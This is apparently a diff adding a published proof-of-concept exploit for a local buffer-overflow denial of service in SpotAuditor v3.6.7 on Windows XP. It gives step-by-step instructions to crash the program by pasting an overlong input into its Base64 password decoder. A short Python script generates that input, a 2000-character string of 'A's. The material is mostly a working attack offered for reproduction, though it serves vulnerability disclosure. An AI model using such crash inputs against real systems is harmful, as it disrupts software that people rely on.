@@ -1,0 +1,23 @@
+# Exploit Title: SpotAuditor v3.6.7 - Denial of Service (PoC)
+# Discovery by: Rafael Pedrero
+# Discovery Date: 2019-01-30
+# Vendor Homepage: http://www.nsauditor.com/order.html
+# Software Link : http://www.nsauditor.com/order.html
+# Tested Version: v3.6.7
+# Tested on: Windows XP SP3
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+
+# Steps to Produce the Crash:
+# 1.- Run SpotAuditor.exe
+# 2.- copy content SpotAuditor_Crash.txt to clipboard (result from this python script)
+# 3.- Go to "Tools" - "Base64 Password Decoder" and paste the result in the "Base64 Encrypted Password:" textbox.
+# 4.- Click in Decrypt button and you will see a crash.
+
+
+#!/usr/bin/env python
+
+
+crash = "\x41" * 2000
+f = open ("SpotAuditor_Crash.txt", "w")
+f.write(crash)
+f.close()
